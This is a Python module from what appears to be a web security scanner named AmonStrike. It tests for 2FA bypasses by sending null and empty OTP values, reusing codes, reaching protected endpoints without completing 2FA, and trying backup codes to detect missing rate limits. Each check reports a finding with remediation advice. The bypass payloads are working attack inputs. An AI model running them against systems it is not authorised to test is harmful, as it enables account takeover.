"""
AmonStrike — 2FA / MFA Bypass Module
Multi-factor authentication bypass techniques.
"""
from .base import BaseModule


class TwofaBypassModule(BaseModule):
    NAME        = "twofa_bypass"
    DESCRIPTION = "2FA bypass — null OTP, reuse, race condition, skip endpoint"

    def run(self):
        self.log("Testing 2FA bypass...")
        self._test_null_otp()
        self._test_otp_reuse()
        self._test_skip_2fa()
        self._test_backup_code_brute()
        self.log(f"2FA bypass complete — {len(self.findings)} findings", "+")
        return self.result()

    def _test_null_otp(self):
        paths = ["/api/auth/otp","/api/2fa","/api/otp/verify","/verify"]
        null_values = ["", "000000", "null", "undefined", "0", "false", " "]
        for path in paths:
            r = self.get(path)
            if not r or r.status_code == 404:
                continue
            for val in null_values:
                r2 = self.post(path, json={"otp": val, "code": val, "token": val})
                if r2 and r2.status_code in [200,201]:
                    if any(w in r2.text.lower() for w in ["success","verified","token","session"]):
                        self.add_finding(
                            title       = f"2FA Bypass — Null/Empty OTP Accepted: '{val}'",
                            severity    = "CRITICAL",
                            description = f"2FA endpoint accepts invalid OTP value '{val}', bypassing MFA entirely.",
                            evidence    = f"Path: {path}\nOTP value: '{val}'\nResponse: {r2.text[:200]}",
                            remediation = "Validate OTP is exactly 6 digits, non-zero, numeric. Reject null/empty/undefined.",
                            url         = self.url + path,
                            parameter   = "otp",
                            payload     = val,
                            cve         = "CWE-287",
                        )
                        return

    def _test_otp_reuse(self):
        """Check if an OTP can be used more than once."""
        paths = ["/api/auth/otp","/api/2fa","/verify"]
        for path in paths:
            r = self.get(path)
            if not r or r.status_code == 404:
                continue
            # Use same OTP twice
            for _ in range(2):
                r2 = self.post(path, json={"otp":"123456","code":"123456"})
            if r2 and r2.status_code in [200,201]:
                self.add_finding(
                    title       = "2FA OTP Reuse Allowed",
                    severity    = "HIGH",
                    description = "Same OTP code was accepted twice. OTPs must be single-use.",
                    evidence    = f"Same OTP used twice at {path}",
                    remediation = "Mark OTP as used immediately after first successful verification.",
                    url         = self.url + path,
                    cve         = "CWE-287",
                )

    def _test_skip_2fa(self):
        """Test if protected endpoints work without completing 2FA."""
        protected = ["/api/dashboard","/api/me","/api/profile","/api/account"]
        for path in protected:
            r = self.get(path)
            if r and r.status_code == 200 and len(r.text) > 50:
                self.add_finding(
                    title       = f"2FA Skip — Protected Endpoint Accessible: {path}",
                    severity    = "HIGH",
                    description = f"{path} returns 200 without 2FA completion. 2FA is bypassable.",
                    evidence    = f"GET {path} → {r.status_code}\n{r.text[:200]}",
                    remediation = "Verify 2FA completion in session middleware before allowing access to any protected resource.",
                    url         = self.url + path,
                    cve         = "CWE-287",
                )

    def _test_backup_code_brute(self):
        paths = ["/api/auth/backup","/api/2fa/backup","/backup-code"]
        for path in paths:
            r = self.get(path)
            if not r or r.status_code == 404:
                continue
            codes = []
            for i in range(10):
                r2 = self.post(path, json={"code": str(i).zfill(8)})
                codes.append(r2.status_code if r2 else 0)
            if all(c not in [429,423] for c in codes):
                self.add_finding(
                    title       = f"Backup Code Brute Force Possible: {path}",
                    severity    = "HIGH",
                    description = "Backup code endpoint has no rate limiting. 8-digit codes can be brute forced.",
                    evidence    = f"10 attempts, none blocked: {set(codes)}",
                    remediation = "Rate limit backup code attempts. Limit to 3 attempts before lockout.",
                    url         = self.url + path,
                    cve         = "CWE-307",
                )
